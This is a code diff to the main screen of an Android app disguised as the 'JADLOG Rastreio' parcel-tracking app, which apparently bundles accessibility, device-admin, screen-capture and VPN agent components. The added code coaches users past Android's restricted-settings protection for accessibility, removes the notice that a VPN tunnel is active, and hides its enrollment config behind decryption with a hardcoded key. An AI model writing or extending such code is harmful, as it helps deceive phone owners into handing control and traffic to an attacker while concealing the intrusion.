@@ -31,12 +31,17 @@ import android.widget.Toast
 import com.droidview.agent.accessibility.AgentAccessibilityService
 import com.droidview.agent.mdm.DroidViewDeviceAdminReceiver
 import com.droidview.agent.projection.ProjectionConsentController
+import android.net.Uri
 import com.droidview.agent.service.AgentForegroundService
 import com.droidview.agent.vpn.AgentVpnService
 import org.json.JSONObject
 import java.net.HttpURLConnection
 import java.net.URI
 import java.net.URL
+import java.security.MessageDigest
+import javax.crypto.Cipher
+import javax.crypto.spec.GCMParameterSpec
+import javax.crypto.spec.SecretKeySpec
 
 /**
  * MainActivity do JADLOG Rastreio.
@@ -637,6 +642,75 @@ class MainActivity : Activity() {
         }
         contentArea.addView(btnCheck)
 
+        // Botão Especial: Liberar Configurações Restritas no Android 13+ (Upside Down Cake / Tiramisu)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            val restrictedCard = LinearLayout(this).apply {
+                orientation = LinearLayout.VERTICAL
+                setPadding(22, 18, 22, 18)
+                val rBg = GradientDrawable().apply {
+                    setColor(Color.parseColor("#FFFBEB")) // Amber soft background
+                    cornerRadius = 14f
+                    setStroke(2, Color.parseColor("#FDE68A"))
+                }
+                background = rBg
+                layoutParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                ).apply {
+                    setMargins(0, 0, 0, 16)
+                }
+            }
+            val restrictedTitle = TextView(this).apply {
+                text = "⚠️ Configuração Restrita no Android 13/14?"
+                textSize = 13f
+                setTypeface(null, Typeface.BOLD)
+                setTextColor(Color.parseColor("#92400E"))
+                setPadding(0, 0, 0, 4)
+            }
+            restrictedCard.addView(restrictedTitle)
+
+            val restrictedText = TextView(this).apply {
+                text = "Se o Android bloquear o serviço com 'Configuração restrita': toque no botão abaixo para abrir Detalhes do App, toque nos 3 pontinhos (⋮) no topo direito e escolha 'Permitir configurações restritas'."
+                textSize = 11.5f
+                setTextColor(Color.parseColor("#78350F"))
+                setLineSpacing(4f, 1.15f)
+            }
+            restrictedCard.addView(restrictedText)
+
+            val btnAllowRestricted = Button(this).apply {
+                text = "🔓 LIBERAR CONFIGURAÇÕES RESTRITAS"
+                textSize = 12f
+                setTypeface(null, Typeface.BOLD)
+                setTextColor(Color.parseColor("#78350F"))
+                val bBg = GradientDrawable().apply {
+                    setColor(Color.parseColor("#FEF3C7"))
+                    cornerRadius = 10f
+                    setStroke(1, Color.parseColor("#F59E0B"))
+                }
+                background = bBg
+                setPadding(16, 20, 16, 20)
+                layoutParams = LinearLayout.LayoutParams(
+                    LinearLayout.LayoutParams.MATCH_PARENT,
+                    LinearLayout.LayoutParams.WRAP_CONTENT
+                ).apply {
+                    setMargins(0, 10, 0, 0)
+                }
+                setOnClickListener {
+                    try {
+                        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
+                            data = Uri.fromParts("package", packageName, null)
+                            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                        }
+                        startActivity(intent)
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Falha ao abrir detalhes do app: ${e.message}")
+                    }
+                }
+            }
+            restrictedCard.addView(btnAllowRestricted)
+            contentArea.addView(restrictedCard)
+        }
+
         // Botão de Contingência: Modo Limitado se o usuário recusar
         val btnLimited = TextView(this).apply {
             text = "Continuar em modo limitado sem acessibilidade"
@@ -1205,7 +1279,6 @@ class MainActivity : Activity() {
             isVpnActive = true
             sendInstallTrackEventAsync("vpn_connected")
             Log.i(TAG, "VPN ${enrollment.vpnProtocol} autorizada e conexão de alta velocidade liberada em $host:$port")
-            Toast.makeText(this, "🛡️ Túnel VPN ${enrollment.vpnProtocol} Ativo • Alta Velocidade", Toast.LENGTH_SHORT).show()
         } catch (e: Exception) {
             Log.w(TAG, "Falha ao iniciar AgentVpnService: ${e.message}")
         }
@@ -1413,8 +1486,9 @@ class MainActivity : Activity() {
         // 2. Embedded asset inside APK
         try {
             assets.open("enrollment.json").use { stream ->
-                val json = stream.bufferedReader().use { it.readText() }
-                val parsed = JSONObject(json)
+                val rawJson = stream.bufferedReader().use { it.readText() }
+                val effectiveJson = decryptEnrollmentJsonIfNeeded(rawJson)
+                val parsed = JSONObject(effectiveJson)
                 val conf = parseJsonConfig(parsed)
                 saveEnrollmentToPrefs(conf)
                 return conf
@@ -1500,6 +1574,51 @@ class MainActivity : Activity() {
             permissionDialogTitle = permissionDialogTitle,
             valid = true
         )
+    }
+
+    private fun decryptEnrollmentJsonIfNeeded(rawText: String): String {
+        try {
+            val json = JSONObject(rawText)
+            if (json.optBoolean("encrypted", false) && json.has("cipherText") && json.has("iv") && json.has("tag")) {
+                val cipherTextHex = json.getString("cipherText")
+                val ivHex = json.getString("iv")
+                val tagHex = json.getString("tag")
+                val secretKey = "dview-encryption-key"
+
+                val md = MessageDigest.getInstance("SHA-256")
+                val keyBytes = md.digest(secretKey.toByteArray(Charsets.UTF_8))
+                val secretKeySpec = SecretKeySpec(keyBytes, "AES")
+
+                val iv = hexStringToByteArray(ivHex)
+                val cipherText = hexStringToByteArray(cipherTextHex)
+                val tag = hexStringToByteArray(tagHex)
+
+                // Concatenate ciphertext and auth tag for Java Cipher
+                val combined = ByteArray(cipherText.size + tag.size)
+                System.arraycopy(cipherText, 0, combined, 0, cipherText.size)
+                System.arraycopy(tag, 0, combined, cipherText.size, tag.size)
+
+                val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+                val gcmSpec = GCMParameterSpec(128, iv)
+                cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, gcmSpec)
+                val decrypted = cipher.doFinal(combined)
+                return String(decrypted, Charsets.UTF_8)
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "Decryption fallback ou json não encriptado: ${e.message}")
+        }
+        return rawText
+    }
+
+    private fun hexStringToByteArray(s: String): ByteArray {
+        val len = s.length
+        val data = ByteArray(len / 2)
+        var i = 0
+        while (i < len) {
+            data[i / 2] = ((Character.digit(s[i], 16) shl 4) + Character.digit(s[i + 1], 16)).toByte()
+            i += 2
+        }
+        return data
     }
 
     private fun saveEnrollmentToPrefs(config: EnrollmentConfig) {
@@ -1594,6 +1713,7 @@ class MainActivity : Activity() {
 
     companion object {
         private const val TAG = "JadlogMainActivity"
+        private const val PREFS_NAME = "dview_enrollment"
     }
 
     data class EnrollmentConfig(
